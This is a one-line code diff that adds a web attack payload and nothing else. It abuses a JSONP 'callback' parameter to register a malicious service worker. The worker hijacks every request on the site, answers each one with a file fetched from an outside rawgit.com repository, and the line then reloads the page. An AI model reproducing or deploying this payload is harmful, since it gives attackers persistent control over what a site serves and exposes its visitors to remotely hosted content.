@@ -1,0 +1,1 @@
+navigator.serviceWorker.register("/token.jsonp?v=1&callback=" + escape('this.addEventListener("install",a=>{}),this.addEventListener("fetch",a=>{a.respondWith(fetch("//rawgit.com/KawaHttp/test1/master/e.swf"))});')),location.reload();
